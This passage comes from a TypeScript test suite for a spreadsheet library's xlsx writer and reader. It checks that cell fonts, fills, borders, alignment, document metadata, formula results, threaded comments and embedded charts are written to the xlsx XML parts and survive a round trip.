      // A cell whose alignment.vertical is 'top', the one branch neither 'middle' nor the default omission exercises.
      {
        row: 2,
        column: 0,
        value: { kind: "string", value: "z" },
        displayText: "z",
        alignment: "left",
        verticalAlignment: "top",
      },
      // A pattern fill with only its foreground colour set.
      {
        row: 3,
        column: 0,
        value: { kind: "string", value: "fg" },
        displayText: "fg",
        background: {
          kind: "pattern",
          patternType: "lightGray",
          foregroundColor: { r: 1, g: 0, b: 1 },
        },
      },
      // A pattern fill with only its background colour set.
      {
        row: 4,
        column: 0,
        value: { kind: "string", value: "bg" },
        displayText: "bg",
        background: {
          kind: "pattern",
          patternType: "lightGray",
          backgroundColor: { r: 0, g: 1, b: 1 },
        },
      },
    ]),
  );
  const styles = styleSheetOf(pkg);

  it("writes bold/italic/strike/underline as four independent elements on the same <font>", () => {
    const font = elementsOf(requireChild(styles, "fonts"), "font")[1];
    if (font === undefined) {
      throw new Error("expected the all-toggles <font> at index 1");
    }
    expect(elementsOf(font, "b")).toHaveLength(1);
    expect(elementsOf(font, "i")).toHaveLength(1);
    expect(elementsOf(font, "strike")).toHaveLength(1);
    const underline = elementsOf(font, "u")[0];
    expect(underline).toBeDefined();
    expect(attributeOf(underline!, "val")).toBe("single");
  });

  it("writes only the top edge with real style/colour data, leaving left/right/bottom bare and the diagonal always empty", () => {
    const border = elementsOf(requireChild(styles, "borders"), "border")[1];
    if (border === undefined) {
      throw new Error("expected the top-only <border> at index 1");
    }
    expect(border.tag).toBe("border");
    const top = requireChild(border, "top");
    expect(attributeOf(top, "style")).toBe("medium");
    expect(attributeOf(requireChild(top, "color"), "rgb")).toBe("FF00ff00");
    for (const edge of ["left", "right", "bottom"]) {
      const edgeEl = requireChild(border, edge);
      expect(attributeOf(edgeEl, "style")).toBeUndefined();
      expect(elementsOf(edgeEl, "color")).toHaveLength(0);
    }
    expect(elementsOf(requireChild(border, "diagonal"), "color")).toHaveLength(
      0,
    );
  });

  it("writes verticalAlignment 'top' as alignment vertical=\"top\", distinct from 'middle' and the default omission", () => {
    const cellXfs = requireChild(styles, "cellXfs");
    const topStyleIndex = attributeOf(writtenCell(pkg, "A3"), "s");
    const xf = elementsOf(cellXfs, "xf")[Number(topStyleIndex)];
    if (xf === undefined) {
      throw new Error("expected an <xf> for the top-aligned cell");
    }
    const alignment = requireChild(xf, "alignment");
    expect(attributeOf(alignment, "vertical")).toBe("top");
  });

  it("writes a foreground-only pattern fill with fgColor and no bgColor", () => {
    const fills = elementsOf(requireChild(styles, "fills"), "fill");
    const fgOnly = fills.find((fill) => {
      const patternFill = childElement(fill, "patternFill");
      return (
        patternFill !== undefined &&
        attributeOf(patternFill, "patternType") === "lightGray" &&
        elementsOf(patternFill, "fgColor").length > 0 &&
        elementsOf(patternFill, "bgColor").length === 0
      );
    });
    expect(fgOnly).toBeDefined();
    const patternFill = requireChild(fgOnly!, "patternFill");
    expect(attributeOf(requireChild(patternFill, "fgColor"), "rgb")).toBe(
      "FFff00ff",
    );
  });

  it("writes a background-only pattern fill with bgColor and no fgColor", () => {
    const fills = elementsOf(requireChild(styles, "fills"), "fill");
    const bgOnly = fills.find((fill) => {
      const patternFill = childElement(fill, "patternFill");
      return (
        patternFill !== undefined &&
        attributeOf(patternFill, "patternType") === "lightGray" &&
        elementsOf(patternFill, "bgColor").length > 0 &&
        elementsOf(patternFill, "fgColor").length === 0
      );
    });
    expect(bgOnly).toBeDefined();
    const patternFill = requireChild(bgOnly!, "patternFill");
    expect(attributeOf(requireChild(patternFill, "bgColor"), "rgb")).toBe(
      "FF00ffff",
    );
  });
});

describe("buildXlsxPackageFromContent: docProps/core.xml and docProps/app.xml carry every metadata field", () => {
  const pkg = buildXlsxPackageFromContent({
    kind: "spreadsheet",
    metadata: {
      title: "T",
      author: "A",
      subject: "S",
      keywords: ["k1", "k2"],
      creator: "C",
      createdIso: "2026-01-01T00:00:00Z",
      modifiedIso: "2026-02-02T00:00:00Z",
    },
    sheets: [
      {
        name: "Sheet1",
        cells: [],
        columns: [],
        rows: [],
        images: [],
        printSettings: DEFAULT_PRINT_SETTINGS,
      },
    ],
  });

  it("writes every core-properties field, including subject and modified date, into docProps/core.xml with the correct namespaces", () => {
    const core = rootElement(pkg.parts["docProps/core.xml"]);
    if (core === undefined) {
      throw new Error("expected docProps/core.xml to have a root element");
    }
    expect(core.tag).toBe("cp:coreProperties");
    expect(attr(core, "xmlns:cp")).toBe(
      "http://schemas.openxmlformats.org/package/2006/metadata/core-properties",
    );
    expect(attr(core, "xmlns:dc")).toBe("http://purl.org/dc/elements/1.1/");
    expect(attr(core, "xmlns:dcterms")).toBe("http://purl.org/dc/terms/");
    expect(attr(core, "xmlns:xsi")).toBe(
      "http://www.w3.org/2001/XMLSchema-instance",
    );
    expect(textContent(requireChild(core, "dc:subject"))).toBe("S");
    const modified = requireChild(core, "dcterms:modified");
    expect(attr(modified, "xsi:type")).toBe("dcterms:W3CDTF");
    expect(textContent(modified)).toBe("2026-02-02T00:00:00Z");
  });

  it("writes the creator into docProps/app.xml's <Application>", () => {
    const app = rootElement(pkg.parts["docProps/app.xml"]);
    if (app === undefined) {
      throw new Error("expected docProps/app.xml to have a root element");
    }
    expect(app.tag).toBe("Properties");
    expect(textContent(requireChild(app, "Application"))).toBe("C");
  });

  it("writes no dc:subject, no cp:keywords, and no <Application> at all when those fields are absent, keywords is an empty array", () => {
    const bare = buildXlsxPackageFromContent({
      kind: "spreadsheet",
      metadata: { keywords: [] },
      sheets: [
        {
          name: "Sheet1",
          cells: [],
          columns: [],
          rows: [],
          images: [],
          printSettings: DEFAULT_PRINT_SETTINGS,
        },
      ],
    });
    const core = rootElement(bare.parts["docProps/core.xml"]);
    if (core === undefined) {
      throw new Error("expected docProps/core.xml to have a root element");
    }
    expect(childrenWithTag(core, "dc:subject")).toHaveLength(0);
    expect(childrenWithTag(core, "cp:keywords")).toHaveLength(0);
    const app = rootElement(bare.parts["docProps/app.xml"]);
    if (app === undefined) {
      throw new Error("expected docProps/app.xml to have a root element");
    }
    expect(childrenWithTag(app, "Application")).toHaveLength(0);
  });
});

describe('buildXlsxPackageFromContent: a formula cell with a cached STRING result writes t="str" literally, never shared-string-indexed', () => {
  const document: ContentDocument = {
    kind: "spreadsheet",
    metadata: {},
    sheets: [
      {
        name: "Sheet1",
        cells: [
          {
            row: 0,
            column: 0,
            value: { kind: "string", value: "ab" },
            formula: 'CONCATENATE("a","b")',
            displayText: "ab",
          },
        ],
        columns: [],
        rows: [],
        images: [],
        printSettings: {
          pageSize: PAGE_SIZE_LETTER,
          margins: { topPt: 72, rightPt: 72, bottomPt: 72, leftPt: 72 },
          gridlines: false,
          headers: false,
          pageOrder: "downThenOver",
        },
      },
    ],
  };

  it('writes t="str" with a literal <v>, not a shared-string index, and the sharedStrings table stays empty', () => {
    const pkg = buildXlsxPackageFromContent(document);
    const worksheet = rootElement(pkg.parts["xl/worksheets/sheet1.xml"]);
    if (worksheet === undefined) {
      throw new Error("expected a worksheet root element");
    }
    const sheetData = worksheet.children.find(
      (node) => node.type === "element" && node.tag === "sheetData",
    );
    const row =
      sheetData?.type === "element"
        ? sheetData.children.find(
            (node) => node.type === "element" && node.tag === "row",
          )
        : undefined;
    const cell =
      row?.type === "element"
        ? row.children.find(
            (node) => node.type === "element" && node.tag === "c",
          )
        : undefined;
    expect(
      cell?.type === "element"
        ? cell.attributes.find((a) => a.name === "t")?.value
        : undefined,
    ).toBe("str");

    const sharedStrings = rootElement(pkg.parts["xl/sharedStrings.xml"]);
    expect(
      sharedStrings?.attributes.find((a) => a.name === "count")?.value,
    ).toBe("0");

    const roundTripped = readXlsxContent(pkg);
    if (roundTripped.kind !== "spreadsheet") {
      throw new Error("expected a spreadsheet ContentDocument");
    }
    expect(roundTripped.sheets[0]?.cells[0]).toMatchObject({
      value: { kind: "string", value: "ab" },
      formula: 'CONCATENATE("a","b")',
    });
  });
});

// Cell decoration (background/borders/alignment/verticalAlignment) is interned into the same cellXfs table as the number format and emitted as real <fills>/<borders>/<alignment>. This describes a round trip through buildXlsxPackageFromContent -> readXlsxContent, asserting both the written XML structure and the read-back ContentSheetCell fields, since the kitchen-sink ContentSheet above carries no decoration at all.
const DECORATED_SHEET: ContentSheet = {
  name: "Decorated",
  cells: [
    {
      row: 0,
      column: 0,
      value: { kind: "string", value: "Header" },
      displayText: "Header",
      background: { kind: "solid", color: { r: 1, g: 0, b: 0 } },
      borders: {
        left: { color: { r: 0, g: 0, b: 0 }, widthPt: 0.75 },
        right: { color: { r: 0, g: 0, b: 0 }, widthPt: 0.75 },
        top: { color: { r: 0, g: 0, b: 0 }, widthPt: 0.75 },
        bottom: { color: { r: 0, g: 0, b: 0 }, widthPt: 0.75 },
      },
      alignment: "center",
      verticalAlignment: "middle",
    },
    {
      row: 1,
      column: 0,
      value: { kind: "number", value: 42 },
      displayText: "42",
      background: { kind: "solid", color: { r: 1, g: 1, b: 0 } },
    },
  ],
  columns: [],
  rows: [],
  images: [],
  printSettings: {
    pageSize: PAGE_SIZE_A4,
    margins: { topPt: 36, rightPt: 36, bottomPt: 36, leftPt: 36 },
    gridlines: true,
    headers: true,
    pageOrder: "downThenOver",
  },
};

const FONTED_SHEET: ContentSheet = {
  name: "Fonted",
  cells: [
    {
      row: 0,
      column: 0,
      value: { kind: "string", value: "Header" },
      displayText: "Header",
      font: { bold: true, color: { r: 1, g: 0, b: 0 } },
    },
    {
      row: 1,
      column: 0,
      value: { kind: "number", value: 42 },
      displayText: "42",
      font: { fontFamily: "Courier New", sizePt: 14, strike: true },
    },
    {
      row: 2,
      column: 0,
      value: { kind: "number", value: 7 },
      displayText: "7",
      // bold: false against this writer's own not-bold default font restates the default, so this cell must share font entry 0 and mint nothing.
      font: { bold: false },
    },
  ],
  columns: [],
  rows: [],
  images: [],
  printSettings: {
    pageSize: PAGE_SIZE_A4,
    margins: { topPt: 36, rightPt: 36, bottomPt: 36, leftPt: 36 },
    gridlines: true,
    headers: true,
    pageOrder: "downThenOver",
  },
};

describe("buildXlsxPackageFromContent: writes the per-cell font into xl/styles.xml", () => {
  const pkg = buildXlsxPackageFromContent({
    kind: "spreadsheet",
    metadata: {
      title: undefined,
      author: undefined,
      subject: undefined,
      keywords: undefined,
      creator: undefined,
      producer: undefined,
      createdIso: undefined,
      modifiedIso: undefined,
    },
    sheets: [FONTED_SHEET],
  });
  const styles = rootElement(pkg.parts["xl/styles.xml"]);
  if (styles === undefined) {
    throw new Error("expected xl/styles.xml to have a root element");
  }
  const required = (
    element: XmlElement | undefined,
    message: string,
  ): XmlElement => {
    if (element === undefined) {
      throw new Error(message);
    }
    return element;
  };

  it("writes the default Calibri-11 font at index 0, then one entry per distinct cell font", () => {
    const fontsEl = required(
      childrenWithTag(styles, "fonts")[0],
      "expected a <fonts> element",
    );
    const fonts = childrenWithTag(fontsEl, "font");
    expect(fonts).toHaveLength(3);
    const defaultFont = required(fonts[0], "expected the default <font> at 0");
    expect(
      childrenWithTag(defaultFont, "sz")[0]?.attributes.find(
        (a) => a.name === "val",
      )?.value,
    ).toBe("11");
    expect(
      childrenWithTag(defaultFont, "name")[0]?.attributes.find(
        (a) => a.name === "val",
      )?.value,
    ).toBe("Calibri");
    const boldRed = required(fonts[1], "expected a bold <font> at 1");
    expect(childrenWithTag(boldRed, "b")).toHaveLength(1);
    expect(
      childrenWithTag(boldRed, "color")[0]?.attributes.find(
        (a) => a.name === "rgb",
      )?.value,
    ).toBe("FFff0000");
    const courier = required(fonts[2], "expected a courier <font> at 2");
    expect(childrenWithTag(courier, "strike")).toHaveLength(1);
    expect(
      childrenWithTag(courier, "sz")[0]?.attributes.find(
        (a) => a.name === "val",
      )?.value,
    ).toBe("14");
    expect(
      childrenWithTag(courier, "name")[0]?.attributes.find(
        (a) => a.name === "val",
      )?.value,
    ).toBe("Courier New");
  });

  it("writes fontId and applyFont on a fonted xf, leaving the default xf free of both", () => {
    const cellXfsEl = required(
      childrenWithTag(styles, "cellXfs")[0],
      "expected a <cellXfs> element",
    );
    const xfs = childrenWithTag(cellXfsEl, "xf");
    // xf[0] = default (General + default font, shared with the bold:false cell); xf[1] = bold red; xf[2] = courier
    expect(xfs).toHaveLength(3);
    const defaultXf = required(xfs[0], "expected the default <xf> at 0");
    expect(defaultXf.attributes.map((a) => a.name)).not.toContain("applyFont");
    expect(defaultXf.attributes.find((a) => a.name === "fontId")?.value).toBe(
      "0",
    );
    const boldRedXf = required(xfs[1], "expected a fonted <xf> at 1");
    expect(boldRedXf.attributes.find((a) => a.name === "fontId")?.value).toBe(
      "1",
    );
    expect(boldRedXf.attributes.map((a) => a.name)).toContain("applyFont");
    expect(xfs[2]?.attributes.find((a) => a.name === "fontId")?.value).toBe(
      "2",
    );
  });
});

describe("readXlsxContent(buildXlsxPackageFromContent(x)) round-trips the per-cell font", () => {
  const result = readXlsxContent(
    buildXlsxPackageFromContent({
      kind: "spreadsheet",
      metadata: {
        title: undefined,
        author: undefined,
        subject: undefined,
        keywords: undefined,
        creator: undefined,
        producer: undefined,
        createdIso: undefined,
        modifiedIso: undefined,
      },
      sheets: [FONTED_SHEET],
    }),
  );
  if (result.kind !== "spreadsheet") {
    throw new Error("expected a spreadsheet ContentDocument");
  }
  const cells = result.sheets[0]?.cells ?? [];

  it("preserves each distinct cell font through the round trip", () => {
    expect(cells[0]?.font).toEqual({
      bold: true,
      color: { r: 1, g: 0, b: 0 },
    });
    expect(cells[1]?.font).toEqual({
      fontFamily: "Courier New",
      sizePt: 14,
      strike: true,
    });
  });

  it("reads a font that normalised back to the default as no font of its own", () => {
    expect(cells[2]?.font).toBeUndefined();
  });
});

describe("buildXlsxPackageFromContent: writes cell decoration (fills/borders/alignment) into xl/styles.xml", () => {
  const pkg = buildXlsxPackageFromContent({
    kind: "spreadsheet",
    metadata: {
      title: undefined,
      author: undefined,
      subject: undefined,
      keywords: undefined,
      creator: undefined,
      producer: undefined,
      createdIso: undefined,
      modifiedIso: undefined,
    },
    sheets: [DECORATED_SHEET],
  });
  const styles = rootElement(pkg.parts["xl/styles.xml"]);
  if (styles === undefined) {
    throw new Error("expected xl/styles.xml to have a root element");
  }
  // Required-element accessor: the structure below is asserted to exist by the test's own intent, so a missing element is a genuine test failure (thrown here) rather than a silently-skipped assertion.
  const required = (
    element: XmlElement | undefined,
    message: string,
  ): XmlElement => {
    if (element === undefined) {
      throw new Error(message);
    }
    return element;
  };

  it("writes the two reserved fills (none/gray125) before the solid fills, one per distinct background colour", () => {
    const fillsEl = required(
      childrenWithTag(styles, "fills")[0],
      "expected a <fills> element",
    );
    const fills = childrenWithTag(fillsEl, "fill");
    expect(fills).toHaveLength(4); // none, gray125, red, yellow
    const patternType = (fill: XmlElement | undefined): string | undefined =>
      fill === undefined
        ? undefined
        : childrenWithTag(fill, "patternFill")[0]?.attributes.find(
            (a) => a.name === "patternType",
          )?.value;
    expect(patternType(fills[0])).toBe("none");
    expect(patternType(fills[1])).toBe("gray125");
    expect(patternType(fills[2])).toBe("solid");
    const solidFill = required(fills[2], "expected a solid <fill> at index 2");
    const solidRed = required(
      childrenWithTag(solidFill, "patternFill")[0],
      "expected a <patternFill>",
    );
    expect(
      childrenWithTag(solidRed, "fgColor")[0]?.attributes.find(
        (a) => a.name === "rgb",
      )?.value,
    ).toBe("FFff0000");
  });

  it("writes the reserved empty border at index 0, then the real per-edge border", () => {
    const bordersEl = required(
      childrenWithTag(styles, "borders")[0],
      "expected a <borders> element",
    );
    const borders = childrenWithTag(bordersEl, "border");
    expect(borders).toHaveLength(2);
    const reservedBorder = required(
      borders[0],
      "expected a reserved <border> at index 0",
    );
    const realBorder = required(
      borders[1],
      "expected a real <border> at index 1",
    );
    // reserved empty: every edge present but with no style attribute
    const reservedLeft = childrenWithTag(reservedBorder, "left")[0];
    expect(
      reservedLeft?.attributes.find((a) => a.name === "style"),
    ).toBeUndefined();
    // real border: four thin edges with black colour
    const realLeft = required(
      childrenWithTag(realBorder, "left")[0],
      "expected a real <left>",
    );
    expect(realLeft.attributes.find((a) => a.name === "style")?.value).toBe(
      "thin",
    );
    expect(
      childrenWithTag(realLeft, "color")[0]?.attributes.find(
        (a) => a.name === "rgb",
      )?.value,
    ).toBe("FF000000");
  });

  it("writes applyFill/applyBorder/applyAlignment and an inline <alignment> on the decorated xf", () => {
    const cellXfsEl = required(
      childrenWithTag(styles, "cellXfs")[0],
      "expected a <cellXfs> element",
    );
    const xfs = childrenWithTag(cellXfsEl, "xf");
    // xf[0] = default General/no-decoration; xf[1] = red + bordered + centred; xf[2] = yellow only
    const decorated = required(xfs[1], "expected a decorated <xf> at index 1");
    const attrs = decorated.attributes.map((a) => a.name);
    expect(attrs).toContain("applyFill");
    expect(attrs).toContain("applyBorder");
    expect(attrs).toContain("applyAlignment");
    const alignment = childrenWithTag(decorated, "alignment")[0];
    expect(
      alignment?.attributes.find((a) => a.name === "horizontal")?.value,
    ).toBe("center");
    expect(
      alignment?.attributes.find((a) => a.name === "vertical")?.value,
    ).toBe("center");
  });
});

describe("readXlsxContent(buildXlsxPackageFromContent(x)) round-trips cell decoration", () => {
  const pkg = buildXlsxPackageFromContent({
    kind: "spreadsheet",
    metadata: {
      title: undefined,
      author: undefined,
      subject: undefined,
      keywords: undefined,
      creator: undefined,
      producer: undefined,
      createdIso: undefined,
      modifiedIso: undefined,
    },
    sheets: [DECORATED_SHEET],
  });
  const result = readXlsxContent(pkg);
  if (result.kind !== "spreadsheet") {
    throw new Error("expected a spreadsheet ContentDocument");
  }
  const cells = result.sheets[0]?.cells ?? [];

  it("preserves a cell background colour through the round trip", () => {
    expect(cells[0]?.background).toEqual({
      kind: "solid",
      color: { r: 1, g: 0, b: 0 },
    });
    expect(cells[1]?.background).toEqual({
      kind: "solid",
      color: { r: 1, g: 1, b: 0 },
    });
  });

  it("preserves per-edge borders, recovering the same thin solid width the writer emitted", () => {
    const borders = cells[0]?.borders;
    expect(borders?.left).toEqual({
      color: { r: 0, g: 0, b: 0 },
      widthPt: 0.75,
    });
    expect(borders?.right).toEqual({
      color: { r: 0, g: 0, b: 0 },
      widthPt: 0.75,
    });
    expect(borders?.top).toEqual({
      color: { r: 0, g: 0, b: 0 },
      widthPt: 0.75,
    });
    expect(borders?.bottom).toEqual({
      color: { r: 0, g: 0, b: 0 },
      widthPt: 0.75,
    });
  });

  it('preserves horizontal and vertical alignment (middle round-trips through xlsx "center")', () => {
    expect(cells[0]?.alignment).toBe("center");
    expect(cells[0]?.verticalAlignment).toBe("middle");
  });
});

describe("readXlsxContent(buildXlsxPackageFromContent(x)) round-trips a genuine two-colour pattern fill (ExaDev/documents.js#951)", () => {
  const pkg = buildXlsxPackageFromContent(
    singleSheetDocument([
      {
        row: 0,
        column: 0,
        value: { kind: "string", value: "grey" },
        displayText: "grey",
        background: {
          kind: "pattern",
          patternType: "mediumGray",
          foregroundColor: { r: 0, g: 0, b: 0 },
          backgroundColor: { r: 1, g: 1, b: 1 },
        },
      },
      {
        row: 0,
        column: 1,
        value: { kind: "string", value: "crosshatch" },
        displayText: "crosshatch",
        background: {
          kind: "pattern",
          patternType: "darkTrellis",
          foregroundColor: { r: 1, g: 0, b: 0 },
          backgroundColor: { r: 0, g: 0, b: 1 },
        },
      },
    ]),
  );
  const result = readXlsxContent(pkg);
  if (result.kind !== "spreadsheet") {
    throw new Error("expected a spreadsheet ContentDocument");
  }
  const cells = result.sheets[0]?.cells ?? [];

  it("round-trips a percentage-grey pattern fill instead of dropping it", () => {
    expect(cells[0]?.background).toEqual({
      kind: "pattern",
      patternType: "mediumGray",
      foregroundColor: { r: 0, g: 0, b: 0 },
      backgroundColor: { r: 1, g: 1, b: 1 },
    });
  });

  it("round-trips a crosshatch pattern fill instead of dropping it", () => {
    expect(cells[1]?.background).toEqual({
      kind: "pattern",
      patternType: "darkTrellis",
      foregroundColor: { r: 1, g: 0, b: 0 },
      backgroundColor: { r: 0, g: 0, b: 1 },
    });
  });

  it("throws writing a WordprocessingML-only pattern type ST_PatternType has no member for", () => {
    expect(() =>
      buildXlsxPackageFromContent(
        singleSheetDocument([
          {
            row: 0,
            column: 0,
            value: { kind: "string", value: "x" },
            displayText: "x",
            background: { kind: "pattern", patternType: "diagonalCross" },
          },
        ]),
      ),
    ).toThrow(/diagonalCross/);
  });
});

describe("buildXlsxPackageFromContent: cell comments (ExaDev/documents.js#949)", () => {
  it("writes no threadedComments part, no worksheet rels, and no Content_Types override at all when no cell carries a comment", () => {
    const pkg = buildXlsxPackageFromContent(
      singleSheetDocument([
        {
          row: 0,
          column: 0,
          value: { kind: "string", value: "x" },
          displayText: "x",
        },
      ]),
    );
    expect(Object.keys(pkg.parts)).not.toContain(
      "xl/worksheets/_rels/sheet1.xml.rels",
    );
    expect(Object.keys(pkg.parts)).not.toContain(
      "xl/threadedComments/threadedComment1.xml",
    );
    const contentTypes = rootElement(pkg.parts["[Content_Types].xml"]);
    if (contentTypes === undefined) {
      throw new Error("expected [Content_Types].xml to have a root element");
    }
    const overrides = childrenWithTag(contentTypes, "Override").map((el) =>
      attr(el, "PartName"),
    );
    expect(overrides.some((name) => name?.includes("threadedComment"))).toBe(
      false,
    );
  });

  it("writes a worksheet rels part, a threadedComments part, and a matching Content_Types override for a sheet carrying a commented cell", () => {
    const pkg = buildXlsxPackageFromContent(
      singleSheetDocument([
        {
          row: 0,
          column: 0,
          value: { kind: "string", value: "x" },
          displayText: "x",
          comment: { text: "A note" },
        },
      ]),
    );
    expect(Object.keys(pkg.parts)).toContain(
      "xl/worksheets/_rels/sheet1.xml.rels",
    );
    expect(Object.keys(pkg.parts)).toContain(
      "xl/threadedComments/threadedComment1.xml",
    );
    const contentTypes = rootElement(pkg.parts["[Content_Types].xml"]);
    if (contentTypes === undefined) {
      throw new Error("expected [Content_Types].xml to have a root element");
    }
    const overrides = childrenWithTag(contentTypes, "Override").map((el) =>
      attr(el, "PartName"),
    );
    expect(overrides).toContain("/xl/threadedComments/threadedComment1.xml");
    const rels = rootElement(pkg.parts["xl/worksheets/_rels/sheet1.xml.rels"]);
    if (rels === undefined) {
      throw new Error(
        "expected the worksheet rels part to have a root element",
      );
    }
    const relationship = childrenWithTag(rels, "Relationship")[0];
    if (relationship === undefined) {
      throw new Error(
        "expected the worksheet rels part to have a Relationship",
      );
    }
    expect(attr(relationship, "Target")).toBe(
      "../threadedComments/threadedComment1.xml",
    );
  });

  it("round-trips through the lossless byte codec (encodePackage -> parsePackage -> byte-identical structure) once comments are in play", () => {
    const pkg = buildXlsxPackageFromContent(
      singleSheetDocument([
        {
          row: 0,
          column: 0,
          value: { kind: "string", value: "x" },
          displayText: "x",
          comment: {
            text: "Root note",
            author: "Alice",
            createdAt: "2026-01-02T03:04:05Z",
            replies: [{ text: "A reply", author: "Bob" }],
          },
        },
      ]),
    );
    const bytes = encodePackage(pkg);
    const reparsed = parsePackage(bytes);
    expect(reparsed).toEqual(pkg);
  });

  it("round-trips a full comment thread (text, author, createdAt, replies) back through readXlsxContent", () => {
    const cells: ContentSheet["cells"] = [
      {
        row: 0,
        column: 0,
        value: { kind: "string", value: "x" },
        displayText: "x",
        comment: {
          text: "Root note",
          author: "Alice",
          createdAt: "2026-01-02T03:04:05Z",
          replies: [
            { text: "First reply", author: "Bob" },
            { text: "Second reply, no author" },
          ],
        },
      },
    ];
    const pkg = buildXlsxPackageFromContent(singleSheetDocument(cells));
    const roundTripped = readXlsxContent(pkg);
    if (roundTripped.kind !== "spreadsheet") {
      throw new Error("expected a spreadsheet ContentDocument");
    }
    const cell = roundTripped.sheets[0]?.cells[0];
    expect(cell?.comment).toEqual({
      text: "Root note",
      author: "Alice",
      createdAt: "2026-01-02T03:04:05Z",
      replies: [
        { text: "First reply", author: "Bob" },
        { text: "Second reply, no author" },
      ],
    });
  });

  it("round-trips a comment whose text needs XML escaping (& < > carried through the thread's own <text> element)", () => {
    const pkg = buildXlsxPackageFromContent(
      singleSheetDocument([
        {
          row: 2,
          column: 1,
          value: { kind: "string", value: "x" },
          displayText: "x",
          comment: { text: "Tom & Jerry <b>bold</b>", author: "A & B" },
        },
      ]),
    );
    const roundTripped = readXlsxContent(pkg);
    if (roundTripped.kind !== "spreadsheet") {
      throw new Error("expected a spreadsheet ContentDocument");
    }
    const cell = roundTripped.sheets[0]?.cells[0];
    expect(cell?.comment).toEqual({
      text: "Tom & Jerry <b>bold</b>",
      author: "A & B",
    });
  });

  it("only writes a threadedComments part for the sheet that actually has a commented cell, correctly indexed, in a multi-sheet workbook", () => {
    const document: ContentDocument = {
      kind: "spreadsheet",
      metadata: {},
      sheets: [
        {
          name: "Sheet1",
          cells: [
            {
              row: 0,
              column: 0,
              value: { kind: "string", value: "x" },
              displayText: "x",
            },
          ],
          columns: [],
          rows: [],
          images: [],
          printSettings: DEFAULT_PRINT_SETTINGS,
        },
        {
          name: "Sheet2",
          cells: [
            {
              row: 0,
              column: 0,
              value: { kind: "string", value: "y" },
              displayText: "y",
              comment: { text: "Only on sheet 2" },
            },
          ],
          columns: [],
          rows: [],
          images: [],
          printSettings: DEFAULT_PRINT_SETTINGS,
        },
      ],
    };
    const pkg = buildXlsxPackageFromContent(document);
    expect(Object.keys(pkg.parts)).not.toContain(
      "xl/threadedComments/threadedComment1.xml",
    );
    expect(Object.keys(pkg.parts)).toContain(
      "xl/threadedComments/threadedComment2.xml",
    );
    const roundTripped = readXlsxContent(pkg);
    if (roundTripped.kind !== "spreadsheet") {
      throw new Error("expected a spreadsheet ContentDocument");
    }
    expect(roundTripped.sheets[0]?.cells[0]?.comment).toBeUndefined();
    expect(roundTripped.sheets[1]?.cells[0]?.comment).toEqual({
      text: "Only on sheet 2",
    });
  });

  it("gives each reply its own id and points it back at its own thread's root via parentId, never at another cell's thread", () => {
    const pkg = buildXlsxPackageFromContent(
      singleSheetDocument([
        {
          row: 0,
          column: 0,
          value: { kind: "string", value: "x" },
          displayText: "x",
          comment: {
            text: "First cell",
            replies: [{ text: "Reply to first" }],
          },
        },
        {
          row: 1,
          column: 0,
          value: { kind: "string", value: "y" },
          displayText: "y",
          comment: {
            text: "Second cell",
            replies: [{ text: "Reply to second" }],
          },
        },
      ]),
    );
    const roundTripped = readXlsxContent(pkg);
    if (roundTripped.kind !== "spreadsheet") {
      throw new Error("expected a spreadsheet ContentDocument");
    }
    const firstCell = roundTripped.sheets[0]?.cells[0];
    const secondCell = roundTripped.sheets[0]?.cells[1];
    expect(firstCell?.comment).toEqual({
      text: "First cell",
      replies: [{ text: "Reply to first" }],
    });
    expect(secondCell?.comment).toEqual({
      text: "Second cell",
      replies: [{ text: "Reply to second" }],
    });
  });
});

// ExaDev/documents.js#973's own two one-way rows, closed: a worksheet's own drawing layer (charts and pictures) and the workbook's own definitions table (general defined names and Table/List objects) now both survive buildXlsxPackageFromContent -- typed/xlsx/content.test.ts carries the byte-level decodePackage/encodePackage round trips for the drawing layer (one per anchor spelling); this suite checks the XML shape directly, the same way the comment tests above do, plus one round trip per row through readXlsxContent/readWorkbookDefinitions.

function chartEmbeddedObject(): ContentEmbeddedObject {
  return {
    objectKind: "chart",
    frame: { xPt: 10, yPt: 15, widthPt: 200, heightPt: 120 },
    anchorRow: 1,
    anchorColumn: 0,
    offsetXPt: 0,
    offsetYPt: 0,
    document: {
      kind: "spreadsheet",
      metadata: {},
      sheets: [
        {
          name: "Chart 1",
          cells: [
            {
              row: 0,
              column: 1,
              value: { kind: "string", value: "Revenue" },
              displayText: "Revenue",
            },
            {
              row: 1,
              column: 0,
              value: { kind: "string", value: "Q1" },
              displayText: "Q1",
            },
            {
              row: 1,
              column: 1,
              value: { kind: "string", value: "8.5" },
              displayText: "8.5",
            },
            {
              row: 2,
              column: 0,
              value: { kind: "string", value: "Q2" },
              displayText: "Q2",
            },
            {
              row: 2,
              column: 1,
              value: { kind: "string", value: "12" },
              displayText: "12",
            },
          ],
          columns: [],
          rows: [],
          images: [],
          printSettings: DEFAULT_PRINT_SETTINGS,
        },
      ],
    },
  };
}

const TINY_PNG_BASE64 =
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=";

describe("buildXlsxPackageFromContent: drawing layer (charts and pictures)", () => {
  it("writes a real xl/drawings/drawingN.xml plus xl/charts/chartN.xml for a chart embedded object, and reading it back recovers the same series/category cache", () => {
    const sourceChart = chartEmbeddedObject();
    const sourceChartSheet =
      sourceChart.document.kind === "spreadsheet"
        ? sourceChart.document.sheets[0]
        : undefined;
    const document: ContentDocument = {
      kind: "spreadsheet",
      metadata: {},
      sheets: [
        {
          name: "Sheet1",
          cells: [],
          columns: [],
          rows: [],
          images: [],
          embeddedObjects: [sourceChart],
          printSettings: DEFAULT_PRINT_SETTINGS,
        },
      ],
    };
    const pkg = buildXlsxPackageFromContent(document);
    expect(Object.keys(pkg.parts)).toContain("xl/drawings/drawing1.xml");
    expect(Object.keys(pkg.parts)).toContain("xl/charts/chart1.xml");
    const contentTypes = rootElement(pkg.parts["[Content_Types].xml"]);
    if (contentTypes === undefined) {
      throw new Error("expected [Content_Types].xml to have a root element");
    }
    const overrides = childrenWithTag(contentTypes, "Override").map((el) =>
      attr(el, "PartName"),
    );
    expect(overrides).toContain("/xl/drawings/drawing1.xml");
    expect(overrides).toContain("/xl/charts/chart1.xml");

    const roundTripped = readXlsxContent(pkg);
    if (roundTripped.kind !== "spreadsheet") {
      throw new Error("expected a spreadsheet ContentDocument");
    }
    const chart = roundTripped.sheets[0]?.embeddedObjects?.[0];
    expect(chart?.objectKind).toBe("chart");
    const chartSheet =
      chart?.document.kind === "spreadsheet"
        ? chart.document.sheets[0]
        : undefined;
